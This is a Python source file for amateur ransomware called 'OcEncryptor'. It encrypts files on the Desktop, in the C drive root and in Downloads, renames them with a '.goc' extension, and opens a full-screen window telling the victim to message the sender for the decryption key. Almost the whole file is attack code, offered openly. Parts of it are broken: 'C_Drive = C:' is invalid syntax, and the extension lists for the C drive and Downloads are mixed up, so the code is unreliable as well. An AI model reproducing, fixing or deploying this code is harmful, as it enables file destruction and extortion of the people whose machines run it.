import os
import cryptography
from cryptography.fernet import Fernet
import tkinter as tk

#Making a folder for all the ransomware files
Desktop = os.path.join(os.environ["HOMEPATH"], "Desktop")
path = os.path.join(Desktop , "OcEncryptor_files")
if os.path.exists(path) != True :
    os.mkdir(path)
    
#Genrating an encryption key
encryption_key = Fernet.generate_key()
f = Fernet(encryption_key)

#Taking all files 
Folder_to_encrypt = Desktop
C_Drive = C:
Downloads =  os.path.join( os.getenv('USERPROFILE'), 'Downloads')
#Making an array to save the extensions
extensions = []
c_file_extension = []
d_file_extension = []

file_with_path = ""

for i in os.listdir(Folder_to_encrypt):

    #Adding the path to the file
    file_path = os.path.join(Folder_to_encrypt, i)
    if os.path.isfile(file_path):
        #This will encrypt the file
        with open(file_path, "rb") as file:
            file_data = file.read()
            encrypted_data = f.encrypt(file_data)
            file.close()
            
        #Writing the encrypted file
        with open(file_path, "wb") as file:
            file.write(encrypted_data)
            file.close()
        
        #Getting the name of the file
        file_name = os.path.basename(file_path)
        index_of_dot = file_name.index('.')
        file_name_without_extension = file_name[:index_of_dot] 
        
        #Saving the extensions to decrypt
        filename, file_extension = os.path.splitext(file_path)
        extensions.append(file_extension)
        
        #Renaming the file
        encrypted_file_path = os.path.join(Folder_to_encrypt, file_name_without_extension + ".goc")
        os.rename(file_path, encrypted_file_path)

#Encrypting the C drive
for i in os.listdir(C_Drive):
    #Adding the path to the file
    file_path = os.path.join(C_Drive, i)
    if os.path.isfile(file_path):
        #This will encrypt the file
        with open(file_path, "rb") as file:
            file_data = file.read()
            encrypted_data = f.encrypt(file_data)
            file.close()
            
        #Writing the encrypted file
        with open(file_path, "wb") as file:
            file.write(encrypted_data)
            file.close()
        
        #Getting the name of the file
        file_name = os.path.basename(file_path)
        index_of_dot = file_name.index('.')
        file_name_without_extension = file_name[:index_of_dot] 
        
        #Saving the extensions to decrypt
        filename, file_extension = os.path.splitext(file_path)
        extensions.append(c_file_extension)
        
        #Renaming the file
        encrypted_file_path = os.path.join(C_Drive, file_name_without_extension + ".goc")
        os.rename(file_path, encrypted_file_path)
        
#Encrypting downloads
for i in os.listdir(Downloads):
    #Adding the path to the file
    file_path = os.path.join(Downloads, i)
    if os.path.isfile(file_path):
        #This will encrypt the file
        with open(file_path, "rb") as file:
            file_data = file.read()
            encrypted_data = f.encrypt(file_data)
            file.close()
            
        #Writing the encrypted file
        with open(file_path, "wb") as file:
            file.write(encrypted_data)
            file.close()
        
        #Getting the name of the file
        file_name = os.path.basename(file_path)
        index_of_dot = file_name.index('.')
        file_name_without_extension = file_name[:index_of_dot] 
        
        #Saving the extensions to decrypt
        filename, file_extension = os.path.splitext(file_path)
        extensions.append(d_file_extension)
        
        #Renaming the file
        encrypted_file_path = os.path.join(Downloads ,  file_name_without_extension + ".goc")
        os.rename(file_path, encrypted_file_path)

#Making the password
decryption_password = "Password"    



d = 0
        
def decrypt_files():
    #Taking the entry from the text box
    password = textbox.get()

    z = 0
    #Checking it
    #If the password is correct
    if password == decryption_password:
        for i in os.listdir(Folder_to_encrypt):
            #Decrypting desktop
            #Adding the path to the file
            file_path = os.path.join(Folder_to_encrypt, i)
            if os.path.isfile(file_path):
                file_name = os.path.basename(file_path)
                index_of_dot = file_name.index('.')
                file_name_without_extension = file_name[:index_of_dot]

                #This will decrypt the file
                with open(file_path, "rb") as file:
                    file_data = file.read()
                    decrypted_data = f.decrypt(file_data)
                    file.close()
                    
                #Writing the decrypted file
                with open(file_path, "wb") as file:
                    file.write(decrypted_data)
                    file.close()

                #Renaming the file
                extension_of_decrypted = extensions[z]
                decrypted_file_path = os.path.join(Folder_to_encrypt, file_name_without_extension + extension_of_decrypted)
                os.rename(file_path , decrypted_file_path)
                z = z+1
            

def decrypt_files_c():
    #Taking the entry from the text box
    password = textbox.get()
    c = 0

    #Checking it
    #If the password is correct
    if password == decryption_password:
        for i in os.listdir(C_Drive):
            #Decrypting desktop
            #Adding the path to the file
            file_path = os.path.join(C_Drive, i)
            if os.path.isfile(file_path):
                file_name = os.path.basename(file_path)
                index_of_dot = file_name.index('.')
                file_name_without_extension = file_name[:index_of_dot]

                #This will decrypt the file
                with open(file_path, "rb") as file:
                    file_data = file.read()
                    decrypted_data = f.decrypt(file_data)
                    file.close()
                    
                #Writing the decrypted file
                with open(file_path, "wb") as file:
                    file.write(decrypted_data)
                    file.close()

                #Renaming the file
                extension_of_decrypted = extensions[c]
                decrypted_file_path = os.path.join(C_Drive, file_name_without_extension + extension_of_decrypted)
                os.rename(file_path , decrypted_file_path)
                c = c+1    
        
        
def decrypt_files_d():
    #Taking the entry from the text box
    password = textbox.get()
    d = 0

    #Checking it
    #If the password is correct
    if password == decryption_password:
        for i in os.listdir(Downloads):
            #Decrypting desktop
            #Adding the path to the file
            file_path = os.path.join(Downloads, i)
            if os.path.isfile(file_path):
                file_name = os.path.basename(file_path)
                index_of_dot = file_name.index('.')
                file_name_without_extension = file_name[:index_of_dot]

                #This will decrypt the file
                with open(file_path, "rb") as file:
                    file_data = file.read()
                    decrypted_data = f.decrypt(file_data)
                    file.close()
                    
                #Writing the decrypted file
                with open(file_path, "wb") as file:
                    file.write(decrypted_data)
                    file.close()

                #Renaming the file
                extension_of_decrypted = extensions[d]
                decrypted_file_path = os.path.join(Downloads, file_name_without_extension + extension_of_decrypted)
                os.rename(file_path , decrypted_file_path)
                d = d+1    
        
#Making the GUI
root = tk.Tk()

#Getting the width and height of the screen
width = root.winfo_screenwidth()
height = root.winfo_screenheight()

#Making the canvas
canvas1 = tk.Canvas(root, width = width, height = height)
canvas1.pack()

#Making the textbox
textbox = tk.Entry (root) 
canvas1.create_window(200, 140, window=textbox)

#Label
decrypted_text = tk.Label(root, text = "DM the person who gave you this for the decryption key  it takes about 10 minutes to decrypt") 
canvas1.create_window(600, 40, window=decrypted_text)

#Making a button
button1 = tk.Button(text="Decrypt Desktop", command=decrypt_files)
canvas1.create_window(200, 180, window = button1 )

button2 = tk.Button(text="Decrypt C drive", command=decrypt_files_c)
canvas1.create_window(400, 180, window = button2 )

button3 = tk.Button(text="Decrypt Downloads", command=decrypt_files_d)
canvas1.create_window(600, 180, window = button3 )

root.mainloop()



